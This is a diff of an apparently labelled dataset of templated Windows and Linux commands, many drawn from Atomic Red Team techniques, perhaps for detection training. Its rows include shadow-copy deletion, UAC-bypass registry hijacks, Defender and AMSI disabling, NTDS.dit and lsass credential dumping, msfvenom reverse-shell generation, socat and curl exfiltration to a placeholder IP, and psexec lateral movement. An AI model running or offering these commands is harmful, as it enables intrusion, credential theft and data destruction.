@@ -25,36 +25,30 @@
 1	reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v ${value_name} /t REG_DWORD /d ${value}
 1	reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v ${value_name} /t REG_DWORD /d ${value}
 1	reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Spynet" /v ${value_name} /t REG_DWORD /d ${value}
-1	reg add "HKLM\SOFTWARE\Policies\Microsoft\WindowsFirewall\DomainProfile" /v ${value_name} /t REG_DWORD /d ${value}
-1	reg add "HKLM\SOFTWARE\Policies\Microsoft\WindowsFirewall\StandardProfile" /v ${value_name} /t REG_DWORD /d ${value}
-1	reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v ${value_name} /t REG_DWORD /d ${value}
-0	reg add hkcu\software\classes\ms-settings\shell\open\command /ve /d "${command_to_execute}" /f && reg add hkcu\software\classes\ms-settings\shell\open\command /v "DelegateExecute" /f
-0	cmd.exe /c "plink.exe ${username}@${ip_address} -pw ${password} -2 -4 -T -N -C -R ${ip_address}:${remote_port}:127.0.0.1:${local_port}"
-0	curl ${source_file_path} -o $ ${destination_file_path}
-0	tar -cvf archive.tar ${source_directory}
-0	choco install putty
-0	red add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce" /V "Atomic Red Team" /t REG_SZ /f /d "${command_to_execute}"
-0	mail -s ${email_subject} ${username}@${domain} < mail.txt
-0	rar a archive.rar ${source_directory}
-0	echo ${email_content} | mpack -s ${email_subject} ${username}@${domain} -a attachement.txt
 0	powershell -c "vssadmin.exe delete shadows /all /quiet"
-0	powershell -c "sc.exe stop ${service_name}"
-0	wevtutil cl ${log_name}
-0	echo Username: %USERNAME%
-0	New-Item "HKCU:\software\classes\mscfile\shell\open\command" -Force; Set-ItemProperty "HKCU:\software\classes\mscfile\shell\open\command" -Name "(default)" -Value "${command_to_execute}" -Force
-0	cmd.exe /c "net.exe stop ${service_name}"
-0	msfvenom -p windows/meterpreter/reverse_http LHOST=${ip_address} LPORT=${port} -f exe -o reverse.exe
-0	copy ${source_file_path} ${destination_file_path}
+0	choco install putty
+0	copy ${shadow_copy_path}\windows\ntds\ntds.dit ${local_file_path}
+0	reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceEx\0001\Depend" /v 1 /d "${command_to_execute}"
+0	powershell -c "vssadmin.exe delete shadows /all /quiet"
+0	powershell -c "wmic.exe shadowcopy delete"
 0	reg add hkcu\software\classes\ms-settings\shell\open\command /ve /d "${command_to_execute}" /f && reg add hkcu\software\classes\ms-settings\shell\open\command /v "DelegateExecute" /f
-0	sc.exe start ${service_name}
-0	powershell -c "curl ${source_file_path} -o $ ${destination_file_path}"
-0	wget https://${ip_address}/${destination_file_path}
-0	cmdkey /list
-0	whoami /all
-0	get-localgroup
-0	curl -X POST --upload-file ${source_file_path} http://${ip_address}:${port}/upload
-0	query user
-0	powershell -c "psexec \\${ip_address} -i -u ${username} -p ${password} ${command_to_execute} -s"
-0	xcopy ${source_file_path} ${destination_file_path}
-0	zip -r archive.zip ${source_directory}
-0	New-Item "HKCU:\software\classes\mscfile\shell\open\command" -Force; Set-ItemProperty "HKCU:\software\classes\mscfile\shell\open\command" -Name "(default)" -Value "${command_to_execute}" -Force
+0	putty -ssh ${ip_address} -l ${username} -pw ${password}
+0	cat ${source_file_path} | ssh ${username}@${ip_address} 'cat > ${destination_file_path}'
+0	reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Svchost" /v "Atomic Red Team" /t REG_MULTI_SZ /d "${command_to_execute}" /f
+0	cmd.exe /c "psexec \\${ip_address} -i -u ${username} -p ${password} ${command_to_execute}"
+0	7z a archive.zip ${source_file_path} -p${password}
+0	scp ${source_file_path} ${username}@${ip_address}:${destination_file_path}
+0	cat ${source_file_path} | socat - TCP:${ip_address}:${port}
+0	sekurlsa::minidump lsassdump.dmp
+0	cmd.exe /c "taskkill.exe /f /im ${process_name}"
+0	msfvenom -p windows/meterpreter/reverse_http LHOST=${ip_address} LPORT=${port} -f exe -o reverse.exe
+0	7z a archive.7z ${source_directory} -p${password}
+0	socat - TCP:${ip_address}:${port} < ${source_file_path}
+0	Set-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name ConsentPromptBehaviorAdmin -Value 0 -Type Dword -Force
+0	net localgroup "Administrators"
+0	Remove-Item -Path "HKLM:\SOFTWARE\Microsoft\AMSI\Providers\{2781761E-28E0-4109-99FE-B9D127C57AFE}" -Recurse
+0	psexec \\${ip_address} -i -u ${username} -p ${password} ${command_to_execute} -s
+0	lockbit.exe -pass ${password}
+0	Start-ATHProcessUnderSpecificParent  -ParentId ${parent_pid} -TestGuid ${test_guid}
+0	copy ${source_file_path} \\${ip_address}\${destination_file_path}
+0	powershell -c "wmic /node:"${ip_address}" shadowcopy call create Volume=C:"
